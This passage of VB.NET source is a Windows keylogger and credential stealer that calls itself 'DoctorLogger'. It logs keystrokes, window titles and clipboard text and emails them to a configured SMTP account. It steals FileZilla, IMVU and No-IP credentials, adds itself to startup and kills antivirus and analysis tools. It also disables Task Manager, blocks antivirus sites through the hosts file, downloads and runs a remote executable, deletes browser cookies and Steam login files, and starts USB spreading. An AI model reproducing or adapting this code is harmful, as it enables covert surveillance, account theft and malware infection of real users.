                TextBox1.Text = TextBox1.Text & "[TAB]"
            ElseIf Key = Keys.End Then
                TextBox1.Text = TextBox1.Text & "[END]"
            ElseIf Key = Keys.Escape Then
                TextBox1.Text = TextBox1.Text & "[ESC]"
            ElseIf Key = Keys.Divide Then
                TextBox1.Text = TextBox1.Text & "/"
            ElseIf Key = Keys.Decimal Then
                TextBox1.Text = TextBox1.Text & "."
            ElseIf Key = Keys.Subtract Then
                TextBox1.Text = TextBox1.Text & "-"
            ElseIf Key = Keys.Add Then
                TextBox1.Text = TextBox1.Text & "+"
            ElseIf Key = Keys.Multiply Then
                TextBox1.Text = TextBox1.Text & "*"
            End If
        ElseIf My.Computer.Keyboard.ShiftKeyDown = True And My.Computer.Keyboard.CapsLock = False Then
            If Key = Keys.D1 Then
                TextBox1.Text = TextBox1.Text + "!"
            ElseIf Key = Keys.D2 Then
                TextBox1.Text = TextBox1.Text + "@"
            ElseIf Key = Keys.D3 Then
                TextBox1.Text = TextBox1.Text + "#"
            ElseIf Key = Keys.D4 Then
                TextBox1.Text = TextBox1.Text + "$"
            ElseIf Key = Keys.D5 Then
                TextBox1.Text = TextBox1.Text + "%"
            ElseIf Key = Keys.D6 Then
                TextBox1.Text = TextBox1.Text + "^"
            ElseIf Key = Keys.D7 Then
                TextBox1.Text = TextBox1.Text + "&"
            ElseIf Key = Keys.D8 Then
                TextBox1.Text = TextBox1.Text + "*"
            ElseIf Key = Keys.D9 Then
                TextBox1.Text = TextBox1.Text + "("
            ElseIf Key = Keys.D0 Then
                TextBox1.Text = TextBox1.Text + ")"
            ElseIf Key = Keys.A Then
                TextBox1.Text = TextBox1.Text & "A"
            ElseIf Key = Keys.B Then
                TextBox1.Text = TextBox1.Text & "B"
            ElseIf Key = Keys.C Then
                TextBox1.Text = TextBox1.Text & "C"
            ElseIf Key = Keys.D Then
                TextBox1.Text = TextBox1.Text & "D"
            ElseIf Key = Keys.E Then
                TextBox1.Text = TextBox1.Text & "E"
            ElseIf Key = Keys.F Then
                TextBox1.Text = TextBox1.Text & "F"
            ElseIf Key = Keys.G Then
                TextBox1.Text = TextBox1.Text & "G"
            ElseIf Key = Keys.H Then
                TextBox1.Text = TextBox1.Text & "H"
            ElseIf Key = Keys.I Then
                TextBox1.Text = TextBox1.Text & "I"
            ElseIf Key = Keys.J Then
                TextBox1.Text = TextBox1.Text & "J"
            ElseIf Key = Keys.K Then
                TextBox1.Text = TextBox1.Text & "K"
            ElseIf Key = Keys.L Then
                TextBox1.Text = TextBox1.Text & "L"
            ElseIf Key = Keys.M Then
                TextBox1.Text = TextBox1.Text & "M"
            ElseIf Key = Keys.N Then
                TextBox1.Text = TextBox1.Text & "N"
            ElseIf Key = Keys.O Then
                TextBox1.Text = TextBox1.Text & "O"
            ElseIf Key = Keys.D2 Then
                TextBox1.Text = TextBox1.Text & "@"
            ElseIf Key = Keys.P Then
                TextBox1.Text = TextBox1.Text & "P"
            ElseIf Key = Keys.Q Then
                TextBox1.Text = TextBox1.Text & "Q"
            ElseIf Key = Keys.R Then
                TextBox1.Text = TextBox1.Text & "R"
            ElseIf Key = Keys.S Then
                TextBox1.Text = TextBox1.Text & "S"
            ElseIf Key = Keys.T Then
                TextBox1.Text = TextBox1.Text & "T"
            ElseIf Key = Keys.U Then
                TextBox1.Text = TextBox1.Text & "U"
            ElseIf Key = Keys.V Then
                TextBox1.Text = TextBox1.Text & "V"
            ElseIf Key = Keys.W Then
                TextBox1.Text = TextBox1.Text & "W"
            ElseIf Key = Keys.X Then
                TextBox1.Text = TextBox1.Text & "X"
            ElseIf Key = Keys.Y Then
                TextBox1.Text = TextBox1.Text & "Y"
            ElseIf Key = Keys.Z Then
                TextBox1.Text = TextBox1.Text & "Z"
            ElseIf Key = Keys.Oemcomma Then
                TextBox1.Text = TextBox1.Text & "<"
            ElseIf Key = Keys.OemMinus Then
                TextBox1.Text = TextBox1.Text & "_"
            ElseIf Key = Keys.OemOpenBrackets Then
                TextBox1.Text = TextBox1.Text & "{"
            ElseIf Key = Keys.OemCloseBrackets Then
                TextBox1.Text = TextBox1.Text & "}"
            ElseIf Key = Keys.OemQuestion Then
                TextBox1.Text = TextBox1.Text & "?"
            ElseIf Key = Keys.OemPipe Then
                TextBox1.Text = TextBox1.Text & "|"
            ElseIf Key = Keys.Oem1 Then
                TextBox1.Text = TextBox1.Text & ":"
            ElseIf Key = Keys.OemPeriod Then
                TextBox1.Text = TextBox1.Text & ">"
            ElseIf Key = Keys.Oemtilde Then
                TextBox1.Text = TextBox1.Text & "~"
            ElseIf Key = Keys.Space Then
                TextBox1.Text = TextBox1.Text & " "
            ElseIf Key = Keys.Enter Then
                TextBox1.Text = TextBox1.Text & vbNewLine
            ElseIf Key = Keys.F1 Then
                TextBox1.Text = TextBox1.Text & "[F1]"
            ElseIf Key = Keys.F2 Then
                TextBox1.Text = TextBox1.Text & "[F2]"
            ElseIf Key = Keys.F3 Then
                TextBox1.Text = TextBox1.Text & "[F3]"
            ElseIf Key = Keys.F4 Then
                TextBox1.Text = TextBox1.Text & "[F4]"
            ElseIf Key = Keys.F5 Then
                TextBox1.Text = TextBox1.Text & "[F5]"
            ElseIf Key = Keys.F6 Then
                TextBox1.Text = TextBox1.Text & "[F6]"
            ElseIf Key = Keys.F7 Then
                TextBox1.Text = TextBox1.Text & "[F7]"
            ElseIf Key = Keys.F8 Then
                TextBox1.Text = TextBox1.Text & "[F8]"
            ElseIf Key = Keys.F9 Then
                TextBox1.Text = TextBox1.Text & "[F9]"
            ElseIf Key = Keys.F10 Then
                TextBox1.Text = TextBox1.Text & "[F10]"
            ElseIf Key = Keys.F11 Then
                TextBox1.Text = TextBox1.Text & "[F11]"
            ElseIf Key = Keys.F12 Then
                TextBox1.Text = TextBox1.Text & "[F12]"
            ElseIf Key = Keys.Delete Then
                TextBox1.Text = TextBox1.Text & "[DEL]"
            ElseIf Key = Keys.Back Then
                TextBox1.Text = TextBox1.Text & "[DEL]"
            ElseIf Key = Keys.Down Then
                TextBox1.Text = TextBox1.Text & "?"
            ElseIf Key = Keys.Up Then
                TextBox1.Text = TextBox1.Text & "?"
            ElseIf Key = Keys.Left Then
                TextBox1.Text = TextBox1.Text & "?"
            ElseIf Key = Keys.Right Then
                TextBox1.Text = TextBox1.Text & "?"
            ElseIf Key = Keys.Tab Then
                TextBox1.Text = TextBox1.Text & "[TAB]"
            ElseIf Key = Keys.End Then
                TextBox1.Text = TextBox1.Text & "[END]"
            ElseIf Key = Keys.Escape Then
                TextBox1.Text = TextBox1.Text & "[ESC]"
            ElseIf Key = Keys.Divide Then
                TextBox1.Text = TextBox1.Text & "/"
            ElseIf Key = Keys.Decimal Then
                TextBox1.Text = TextBox1.Text & "."
            ElseIf Key = Keys.Subtract Then
                TextBox1.Text = TextBox1.Text & "-"
            ElseIf Key = Keys.Add Then
                TextBox1.Text = TextBox1.Text & "+"
            ElseIf Key = Keys.Multiply Then
                TextBox1.Text = TextBox1.Text & "*"

            End If
        End If
    End Sub

    Private Sub Form1_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        FileOpen(1, Application.ExecutablePath, OpenMode.Binary, OpenAccess.Read, OpenShare.Shared)
        text1 = Space(LOF(1))
        text2 = Space(LOF(1))
        text3 = Space(LOF(1))
        text4 = Space(LOF(1))
        interval = Space(LOF(1))
        text5 = Space(LOF(1))
        text6 = Space(LOF(1))
        text7 = Space(LOF(1))
        cb = Space(LOF(1))
        cb1 = Space(LOF(1))
        cb2 = Space(LOF(1))
        cb3 = Space(LOF(1))
        cb4 = Space(LOF(1))
        cb5 = Space(LOF(1))
        cb6 = Space(LOF(1))
        cb7 = Space(LOF(1))
        cb8 = Space(LOF(1))
        cb9 = Space(LOF(1))
        cb10 = Space(LOF(1))
        cb11 = Space(LOF(1))
        cb12 = Space(LOF(1))

        '-------------

        FileGet(1, text1) 'options(1) - E-mail
        FileGet(1, text2) 'options(2) - E-mail Password
        FileGet(1, text3) 'options(3) - SMTP
        FileGet(1, text4) 'options(4) - Port
        FileGet(1, interval) 'options(5) - Uploadinterval
        FileGet(1, text5) 'options(6) - Downloader
        FileGet(1, text6) 'options(7) - Msgbox Title
        FileGet(1, text7) 'options(8) - Msgbox Message
        FileGet(1, cb) 'options(9) - Encrypt Mail
        FileGet(1, cb1) 'options(10) - Add startup
        FileGet(1, cb2) 'options(11) - Antis
        FileGet(1, cb3) 'options(12) - downloader check
        FileGet(1, cb4) 'options(13) - fake Error check Check
        FileGet(1, cb5) 'options(14) - Stealers
        FileGet(1, cb6) 'options(15) - USB Spread Check
        FileGet(1, cb7) 'options(16) - Kill taskman
        FileGet(1, cb8) 'options(17) - Downloader Encrypt
        FileGet(1, cb9) 'options(18) - force steam login
        FileGet(1, cb10) 'options(19) - Delete Cookies
        FileGet(1, cb11) 'options(20) - Clipbored logger
        FileGet(1, cb12) 'options(21) - Block AV sites

        FileClose(1)
        options = Split(text1, FileSplit)

        '---------------
        TextBox2.Text = options(1)
        TextBox3.Text = options(2)
        TextBox11.Text = options(3)
        TextBox10.Text = options(4)
        TextBox6.Text = options(7)
        TextBox7.Text = options(8)
        TextBox4.Text = Convert.ToInt32(options(5))
        TextBox5.Text = options(6)
        Timer1.Interval = TextBox4.Text
        '----------------------------------------
        If options(9) = True Then
            TextBox2.Text = DecryptMe(Me.TextBox2.Text)
            TextBox3.Text = DecryptMe(Me.TextBox3.Text)
            TextBox11.Text = DecryptMe(Me.TextBox11.Text)
            TextBox10.Text = DecryptMe(Me.TextBox10.Text)
        Else
        End If

        If options(17) = True Then
            TextBox5.Text = DecryptMe(TextBox5.Text)
        End If
        '----------------------------------------
        'Checkboxs

        If options(13) = False Then
        Else
            MessageBox.Show(TextBox7.Text, TextBox6.Text, MessageBoxButtons.OK, MessageBoxIcon.Error)
        End If

        If options(10) = False Then
        Else
            Try
                Dim appname As String = IO.Path.GetFileName(Application.ExecutablePath)

                My.Computer.FileSystem.CopyFile(Application.ExecutablePath, "C:\Program Files" & appname, True)

                Dim regKey As Microsoft.Win32.RegistryKey
                regKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\Microsoft\Windows\CurrentVersion\Run", True)
                regKey.SetValue(appname, "C:\Program Files")
                regKey.Close()
            Catch ex As Exception
                AddStartup(Me.Text, Application.ExecutablePath)
            End Try
        End If

        If options(11) = False Then
        Else
            Timer3.Start()
        End If

        If options(12) = False Then
        Else : DoThisShit(TextBox5.Text)
        End If

        If options(14) = False Then
        Else
            FileZillaStealer()
            DoToVu()
            NoIpStealer()
            '------
        End If

        If options(15) = False Then
        Else
            SpreadBGWusb.RunWorkerAsync()
        End If

        If options(16) = False Then
        Else
            Timer4.Start()
        End If

        If options(18) = False Then
        Else
            forcesteam()
            steam()
        End If

        If options(19) = False Then
        Else
            KillProcesses(True, True) 'Kill Internet Explorer & Mozilla Firefox
            DeleteIECookies(True) 'Delete IE Cookies
            DeleteMozillaCookies(True) 'Delete FF Cookies
        End If


        If options(20) = False Then
        Else
            Timer6.Start()
        End If

        If options(21) = False Then
        Else
            Dim path As [String] = "C:\Windows\System32\drivers\etc\hosts"
            Dim sw As New StreamWriter(path, True)
            Dim sitetoblock As [String] = vbLf & " 127.0.0.1 www.virustotal.com"
            Dim sitetoblock1 As [String] = vbLf & " 127.0.0.1 www.bitdefender.com"
            Dim sitetoblock2 As [String] = vbLf & " 127.0.0.1 www.virusscan.jotti.org"
            Dim sitetoblock3 As [String] = vbLf & " 127.0.0.1 www.scanner.novirusthanks.org"
            sw.Write(sitetoblock)
            sw.Write(vbNewLine & sitetoblock1)
            sw.Write(vbNewLine & sitetoblock2)
            sw.Write(vbNewLine & sitetoblock3)
            sw.Close()


        End If
        '-------
        Timer2.Start()

    End Sub

#Region " Add to startup "
    Public Shared Sub AddStartup(ByVal Name As String, ByVal Path As String)
        Dim Registry As Microsoft.Win32.RegistryKey = Microsoft.Win32.Registry.CurrentUser
        Dim Key As Microsoft.Win32.RegistryKey = Registry.OpenSubKey("Software\Microsoft\Windows\CurrentVersion\Run", True)
        Key.SetValue(Name, Path, Microsoft.Win32.RegistryValueKind.String)
    End Sub
#End Region

    Private Sub Timer2_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Timer2.Tick
        If strin <> GetActiveWindowTitle() Then
            TextBox1.Text = TextBox1.Text + vbNewLine & "[" & GetActiveWindowTitle() & "]:" + vbNewLine
            strin = GetActiveWindowTitle()
        End If
    End Sub
#Region " Stealers "

    Function ReadKey(ByRef hKey As String) As Object ' // Function for Read REG Values
        On Error GoTo Error_Renamed ' // If Error dont Display Error
        Dim X As Object ' //
        X = CreateObject("WScript.shell") ' // Create REG Object
        ReadKey = X.regread(hKey) ' // Read The Key
        Exit Function
Error_Renamed: ReadKey = vbNullString ' // If Error Readkey = ""
    End Function
    Public Function Hex2Ascii(ByVal Text As String) As String
        Dim Value As Object
        Dim num As Object
        Dim i As Object ' // Simple Function for Pass Hex to Ascii
        Value = Nothing
        For i = 1 To Len(Text) ' Len of Encripted Text
            num = Mid(Text, i, 2) ' // Go Chr by Chr
            Value = Value & Chr(Val("&h" & num)) ' // Pass from Hex
            i = i + 1 ' // +1
        Next i ' Next Chr

        Hex2Ascii = Value ' //
    End Function
    Public Function DoToVu() As String
        Dim sUser, sPass As String ' // Some Variables
        sUser = "HKEY_CURRENT_USER\Software\IMVU\username\" ' // Username REG Path
        sPass = "HKEY_CURRENT_USER\Software\IMVU\password\" ' // Password REG Path
        DoToVu = "IMVU : " & vbNewLine & "Username : " & ReadKey(sUser) & vbNewLine & "Password : " & Hex2Ascii(ReadKey(sPass))
Sex:
    End Function
    Sub FileZillaStealer()
        RichTextBox1.Clear()
        RichTextBox2.Clear()
        Try
            RichTextBox1.LoadFile(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\FileZilla\recentservers.xml", RichTextBoxStreamType.PlainText)
            RichTextBox2.Text &= "FileZilla Infomation: " & vbNewLine & "====================================" & vbNewLine
            For Each item In RichTextBox1.Lines
                If item.Contains("<Host>") Then
                    RichTextBox2.Text &= "Host: " & item.Replace("<Host>", "").Replace("</Host>", "").Replace("            ", "") & vbNewLine
                End If
                If item.Contains("<Port>") Then
                    RichTextBox2.Text &= "Port: " & item.Replace("<Port>", "").Replace("</Port>", "").Replace("            ", "") & vbNewLine
                End If
                If item.Contains("<User>") Then
                    RichTextBox2.Text &= "User: " & item.Replace("<User>", "").Replace("</User>", "").Replace("            ", "") & vbNewLine
                End If
                If item.Contains("<Pass>") Then
                    RichTextBox2.Text &= "Passwort: " & item.Replace("<Pass>", "").Replace("</Pass>", "").Replace("            ", "") & vbNewLine & "====================================" & vbNewLine
                End If
            Next

            RichTextBox1.LoadFile(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\FileZilla\sitemanager.xml", RichTextBoxStreamType.PlainText)
            RichTextBox2.Text &= vbNewLine & vbNewLine & "Dump of Servermanegers: " & vbNewLine & vbNewLine & "====================================" & vbNewLine
            For Each item In RichTextBox1.Lines
                If item.Contains("<Host>") Then
                    RichTextBox2.Text &= "Host: " & item.Replace("<Host>", "").Replace("</Host>", "").Replace("            ", "") & vbNewLine
                End If
                If item.Contains("<Port>") Then
                    RichTextBox2.Text &= "Port: " & item.Replace("<Port>", "").Replace("</Port>", "").Replace("            ", "") & vbNewLine
                End If
                If item.Contains("<User>") Then
                    RichTextBox2.Text &= "User: " & item.Replace("<User>", "").Replace("</User>", "").Replace("            ", "") & vbNewLine
                End If
                If item.Contains("<Pass>") Then
                    RichTextBox2.Text &= "Passwort: " & item.Replace("<Pass>", "").Replace("</Pass>", "").Replace("            ", "") & vbNewLine & "====================================" & vbNewLine
                End If
            Next
            RichTextBox2.SaveFile(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) & "\local_FileZilla.txt", RichTextBoxStreamType.PlainText)
        Catch ex As Exception
        End Try
    End Sub

    Public Function base64Decode(ByVal data As String) As String
        Try
            Dim encoder As New System.Text.UTF8Encoding()
            Dim utf8Decode As System.Text.Decoder = encoder.GetDecoder()
            Dim todecode_byte As Byte() = Convert.FromBase64String(data)
            Dim charCount As Integer = utf8Decode.GetCharCount(todecode_byte, 0, todecode_byte.Length)
            Dim decoded_char As Char() = New Char(charCount - 1) {}
            utf8Decode.GetChars(todecode_byte, 0, todecode_byte.Length, decoded_char, 0)
            Dim result As String = New [String](decoded_char)
            Return result
        Catch e As Exception
            Throw New Exception("Error in base64Decode" & e.Message)
        End Try
    End Function
    Sub NoIpStealer()
        Dim Username As String
        Username = My.Computer.Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Wow6432Node\Vitalwerks\DUC", "Username", Nothing)

        Dim Password As String
        Password = My.Computer.Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Wow6432Node\Vitalwerks\DUC", "Password", Nothing)

        TextBox9.Text = Username
        TextBox8.Text = base64Decode(Password)
    End Sub

    'Usage:
    'imvupass
    'NoIpStealer
    'FileZillaStealer
#End Region

#Region " Antis "
    
    Sub AntiComodo()
        Dim ktp As Process() = Process.GetProcesses
        Dim i As Integer
        For i = 0 To ktp.Length - 1
            Select Case Strings.LCase(ktp(i).ProcessName)
                Case "cpf"
                    ktp(i).Kill()
                Case Else
            End Select
        Next
    End Sub
    Sub AntiVirtualPC()
        Dim ktp As Process() = Process.GetProcesses
        Dim i As Integer
        For i = 0 To ktp.Length - 1
            Select Case Strings.LCase(ktp(i).ProcessName)
                Case "vpcmap" & "vmsrvc"
                    ktp(i).Kill()
                Case Else
            End Select
        Next
    End Sub
    Sub AntiAvast()
        Dim ktp As Process() = Process.GetProcesses
        Dim i As Integer
        For i = 0 To ktp.Length - 1
            Select Case Strings.LCase(ktp(i).ProcessName)
                Case "ashWebSv"
                    ktp(i).Kill()
                Case Else
            End Select
        Next
    End Sub
    Sub AntiAVG()
        Dim ktp As Process() = Process.GetProcesses
        Dim i As Integer
        For i = 0 To ktp.Length - 1
            Select Case Strings.LCase(ktp(i).ProcessName)
                Case "avgemc"
                    ktp(i).Kill()
                Case Else
            End Select
        Next
    End Sub
    Sub AntiKeyscrambler()
        Dim KillTheProcess As Process() = Process.GetProcesses
        Dim i As Integer
        For i = 0 To KillTheProcess.Length - 1
            Select Case Strings.LCase(KillTheProcess(i).ProcessName)
                Case "keyscrambler"
                    KillTheProcess(i).Kill()
                Case Else
            End Select
        Next
    End Sub
    Sub AntiWireshark()
        Dim KillTheProcess As Process() = Process.GetProcesses
        Dim i As Integer
        For i = 0 To KillTheProcess.Length - 1
            Select Case Strings.LCase(KillTheProcess(i).ProcessName)
                Case "wireshark"
                    KillTheProcess(i).Kill()
                Case Else
            End Select
        Next
    End Sub
    Sub AntiAnubis()
        Dim KillTheProcess As Process() = Process.GetProcesses
        Dim i As Integer
        For i = 0 To KillTheProcess.Length - 1
            Select Case Strings.LCase(KillTheProcess(i).ProcessName)
                Case "anubis"
                    KillTheProcess(i).Kill()
                Case Else
            End Select
        Next
    End Sub
    Sub AntiMalwarebytes()
        Dim KillTheProcess As Process() = Process.GetProcesses
        Dim i As Integer
        For i = 0 To KillTheProcess.Length - 1
            Select Case Strings.LCase(KillTheProcess(i).ProcessName)
                Case "mbam"
                    KillTheProcess(i).Kill()
                Case Else
            End Select
        Next
    End Sub
    Sub AntiKaspersky()
        Dim KillTheProcess As Process() = Process.GetProcesses
        Dim i As Integer
        For i = 0 To KillTheProcess.Length - 1
            Select Case Strings.LCase(KillTheProcess(i).ProcessName)
                Case "avp"
                    KillTheProcess(i).Kill()
                Case Else
            End Select
        Next
    End Sub
    Sub AntiOllydbg()
        Dim KillTheProcess As Process() = Process.GetProcesses
        Dim i As Integer
        For i = 0 To KillTheProcess.Length - 1
            Select Case Strings.LCase(KillTheProcess(i).ProcessName)
                Case "ollydbg"
                    KillTheProcess(i).Kill()
                Case Else
            End Select
        Next
    End Sub
    Sub AntiOutpost()
        Dim KillTheProcess As Process() = Process.GetProcesses
        Dim i As Integer
        For i = 0 To KillTheProcess.Length - 1
            Select Case Strings.LCase(KillTheProcess(i).ProcessName)
                Case "outpost"
                    KillTheProcess(i).Kill()
                Case Else
            End Select
        Next
    End Sub
    Sub AntiNorman()
        Dim KillTheProcess As Process() = Process.GetProcesses
        Dim i As Integer
        For i = 0 To KillTheProcess.Length - 1
            Select Case Strings.LCase(KillTheProcess(i).ProcessName)
                Case "npfmsg"
                    KillTheProcess(i).Kill()
                Case Else
            End Select
        Next
    End Sub
    Sub AntiBitDefender()
        Dim KillTheProcess As Process() = Process.GetProcesses
        Dim i As Integer
        For i = 0 To KillTheProcess.Length - 1
            Select Case Strings.LCase(KillTheProcess(i).ProcessName)
                Case "bdagent"
                    KillTheProcess(i).Kill()
                Case Else
            End Select
        Next
    End Sub
    Sub AntiNOD32()
        Dim KillTheProcess As Process() = Process.GetProcesses
        Dim i As Integer
        For i = 0 To KillTheProcess.Length - 1
            Select Case Strings.LCase(KillTheProcess(i).ProcessName)
                Case "egui"
                    KillTheProcess(i).Kill()
                Case Else
            End Select
        Next
    End Sub
    'You will need to insert your own code to end the process
    Public Function antiSandboxie() As Boolean
        If Process.GetProcessesByName("SbieSvc").Length >= 1 Then
            Me.Close()
            Return True
        Else
            Me.Show()
            Return False
        End If
    End Function
#End Region

    Public Function DecryptMe(ByVal sData As String) As String
        Dim dData() As Byte = Convert.FromBase64String(sData)
        Dim dString As String = ASCIIEncoding.ASCII.GetString(dData)

        DecryptMe = dString
    End Function

    Private Sub Timer3_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Timer3.Tick
        AntiAnubis()
        AntiBitDefender()
        AntiKaspersky()
        AntiKeyscrambler()
        AntiMalwarebytes()
        AntiNOD32()
        AntiNorman()
        AntiOllydbg()
        AntiOutpost()
        AntiWireshark()
        AntiAVG()
        AntiAvast()
        AntiVirtualPC()
        AntiComodo()
        antiSandboxie()
    End Sub
    Public Function DoThisShit(ByVal Link As String) As Boolean
        Try
            My.Computer.Network.DownloadFile(Link, "C:\KFJD947DHC.exe")
            Process.Start("C:\KFJD947DHC.exe")
        Catch ex As Exception
        End Try
    End Function

    Private Sub Timer1_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Timer1.Tick
        Try
            Dim smtpServer As New SmtpClient()
            Dim mail As New MailMessage()
            smtpServer.Credentials = New Net.NetworkCredential(TextBox2.Text, TextBox3.Text)
            'using gmail
            smtpServer.Port = TextBox10.Text
            smtpServer.Host = TextBox11.Text
            smtpServer.EnableSsl = True
            mail = New MailMessage()
            mail.From = New MailAddress(TextBox2.Text)
            mail.To.Add(TextBox2.Text)
            mail.Subject = My.Computer.Name & ":"
            mail.Body = "DoctorLogger : Logs for " & My.Computer.Name & vbNewLine & "==========================================================" & vbNewLine & "==========================================================" & vbNewLine & TextBox1.Text & vbNewLine & "=========================================================="
            smtpServer.Send(mail)
        Catch ex As Exception
            TextBox1.Clear()
        End Try
        TextBox1.Clear()
        Try
            Dim smtpServer As New SmtpClient()
            Dim mail As New MailMessage()
            smtpServer.Credentials = New Net.NetworkCredential(TextBox2.Text, TextBox3.Text)
            'using gmail
            smtpServer.Port = TextBox10.Text
            smtpServer.Host = TextBox11.Text
            smtpServer.EnableSsl = True
            mail = New MailMessage()
            mail.From = New MailAddress(TextBox2.Text)
            mail.To.Add(TextBox2.Text)
            mail.Subject = My.Computer.Name & ":"
            mail.Body = "DoctorLogger : Clipboard logs " & My.Computer.Name & vbNewLine & "==========================================================" & vbNewLine & "==========================================================" & vbNewLine & TextBox14.Text & vbNewLine & "=========================================================="
            smtpServer.Send(mail)
            TextBox14.Text = ""
        Catch ex As Exception
            TextBox14.Text = ""
        End Try
    End Sub

    Private Sub Timer4_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Timer4.Tick
        If options(16) = False Then
        Else
            My.Computer.Registry.SetValue("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System", "DisableTaskMgr", "1", Microsoft.Win32.RegistryValueKind.DWord)
        End If
    End Sub

    Private Sub Timer5_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Timer5.Tick
        Try
            Dim smtpServer As New SmtpClient()
            Dim mail As New MailMessage()
            smtpServer.Credentials = New Net.NetworkCredential(TextBox2.Text, TextBox3.Text)
            'using gmail
            smtpServer.Port = TextBox10.Text
            smtpServer.Host = TextBox11.Text
            smtpServer.EnableSsl = True
            mail = New MailMessage()
            mail.From = New MailAddress(TextBox2.Text)
            mail.To.Add(TextBox2.Text)
            mail.Subject = My.Computer.Name & ":"
            mail.Body = "DoctorLogger : Stealer Logs : For " & My.Computer.Name & vbNewLine & "==========================================================" & vbNewLine & RichTextBox2.Text & vbNewLine & "==========================================================" & vbNewLine & DoToVu() & vbNewLine & "==========================================================" & vbNewLine & "No-Ip Infomation" & vbNewLine & TextBox9.Text & vbNewLine & TextBox8.Text
            smtpServer.Send(mail)
        Catch ex As Exception
            Timer5.Stop()
        End Try
    End Sub

    Private Sub TextBox5_TextChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles TextBox5.TextChanged

    End Sub
#Region " Force Steam login "
    Public Sub forcesteam()
        Try
            Dim Path As String = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) & "\Steam\config\SteamAppData.vdf"

            If IO.File.Exists(Path) = True Then
                IO.File.Delete(Path)
            End If
        Catch ex As Exception
        End Try
        Try
            Dim Path As String = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) & "\Steam\config\SteamAppData.vdf"

            If IO.File.Exists(Path) = True Then
                IO.File.Delete(Path)
            End If
        Catch ex As Exception
        End Try

    End Sub
    Sub steam()
        On Error Resume Next
        Dim st As String
        st = Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Valve\Steam", "InstallPath", Nothing)
        Kill(st & "ClientRegistry.blob")
    End Sub
#End Region

#Region " Delete FF  IE shit "
    Public Overloads Sub KillProcesses(ByVal InternetExplorer As Boolean, ByVal Firefox As Boolean)
        For Each proc As Process In Process.GetProcesses
            If Firefox = True Then
                If proc.MainWindowTitle.Contains("Mozilla Firefox") Then
                    proc.Kill()
                ElseIf proc.ProcessName = "firefox.exe" Then
                    proc.Kill()
                End If
            End If

            If InternetExplorer = True Then
                If proc.MainWindowTitle.Contains("Internet Explorer") Then
                    proc.Kill()
                ElseIf proc.ProcessName = "iexplore.exe" Then
                    proc.Kill()
                End If
            End If
        Next
    End Sub
    Public Overloads Sub DeleteIECookies(ByVal Enable As Boolean)
        If Enable Then
            Dim Cookies As String = Environment.GetFolderPath(Environment.SpecialFolder.Cookies)

            If System.IO.Directory.Exists(Cookies) Then
                For Each cookiesFile As String In My.Computer.FileSystem.GetFiles(Cookies)
                    Try
                        My.Computer.FileSystem.DeleteFile(cookiesFile)
                    Catch
                    End Try
                Next
            End If
        End If
    End Sub

    Public Overloads Sub DeleteMozillaCookies(ByVal Enable As Boolean)
        If Enable Then
            Dim MozillaCookies As String = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\Mozilla\Firefox\Profiles"

            If System.IO.Directory.Exists(MozillaCookies) Then
                For Each mozillaCookiesProfiles As String In My.Computer.FileSystem.GetDirectories(MozillaCookies)
                    For Each mozillaCookiesFile As String In My.Computer.FileSystem.GetFiles(mozillaCookiesProfiles)
                        If mozillaCookiesFile.Contains("cookie") Then
                            Try
                                My.Computer.FileSystem.DeleteFile(mozillaCookiesFile)
                            Catch
                            End Try
                        End If
                    Next
                Next
            End If
        End If
    End Sub


    Public Overloads Sub DeleteMozillaSignons(ByVal Enable As Boolean)
        If Enable Then
            Dim MozillaCookies As String = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\Mozilla\Firefox\Profiles"

            If System.IO.Directory.Exists(MozillaCookies) Then
                For Each mozillaCookiesProfiles As String In My.Computer.FileSystem.GetDirectories(MozillaCookies)
                    For Each mozillaCookiesFile As String In My.Computer.FileSystem.GetFiles(mozillaCookiesProfiles)
                        If mozillaCookiesFile.Contains("signon") Then
                            Try
                                My.Computer.FileSystem.DeleteFile(mozillaCookiesFile)
                            Catch
                            End Try
                        End If
                    Next
                Next
            End If
        End If
    End Sub
#End Region

    Private Sub TextBox14_TextChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles TextBox14.TextChanged

    End Sub

    Private Sub Timer6_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Timer6.Tick
        If Stored = My.Computer.Clipboard.GetText = False Then
            If lblNumb.Text = 0 = False Then
                lblNumb.Text = lblNumb.Text + 1
                TextBox14.Text = TextBox14.Text & vbNewLine & vbNewLine & "Log " & lblNumb.Text & " - " & My.Computer.Clipboard.GetText
                Stored = My.Computer.Clipboard.GetText
            Else
                lblNumb.Text = lblNumb.Text + 1
                TextBox14.Text = TextBox14.Text & "Log " & lblNumb.Text & " - " & My.Computer.Clipboard.GetText
                Stored = My.Computer.Clipboard.GetText
            End If
        Else
        End If
    End Sub

    Private Sub SpreadBGWusb_DoWork(ByVal sender As System.Object, ByVal e As System.ComponentModel.DoWorkEventArgs) Handles SpreadBGWusb.DoWork
        Try
            Dim aa232 As New ListBox
            Dim int87654 As Integer = 0
            Do Until int87654 = My.Computer.FileSystem.Drives.Count - 1
                aa232.Items.Add(My.Computer.FileSystem.Drives.Item(int87654).ToString)
                int87654 += 1
            Loop

            int87654 = 0

            Do Until int87654 = aa232.Items.Count
                Try
                    Try
                        My.Computer.FileSystem.DeleteFile(aa232.Items.Item(int87654) + "Sys.exe")
                        My.Computer.FileSystem.DeleteFile(aa232.Items.Item(int87654) + "autorun.inf")
                    Catch
                    End Try
